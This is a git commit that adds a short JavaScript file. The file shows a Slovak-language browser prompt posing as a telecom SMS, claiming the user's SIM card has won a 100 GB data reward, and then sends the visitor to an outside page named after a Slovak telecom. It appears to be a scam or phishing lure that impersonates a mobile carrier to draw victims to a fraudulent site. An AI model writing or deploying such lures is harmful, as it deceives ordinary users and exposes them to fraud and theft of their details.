acb6f9fd55b34b23056fd37a7e2883a840160b47
ekperikpe <ekperikpe588@gmail.com>
2025-04-21 10:08:58 +0100

    Create slovak-active.js

---
+++ slovak-active.js
@@ -0,0 +1,5 @@
+var password = 'Aktivujte 100 GB'
+password=prompt('SMS: Blahoželáme, vaša SIM karta má nárok na odmenu za 100 GB starú SIM kartu, kliknutím na OK ju teraz aktivujte','Aktivujte 100 GB');
+if (password != 'Aktivujte 100 GB') {
+location.href='https://sharpupdate.org/slovak-telecom';
+}
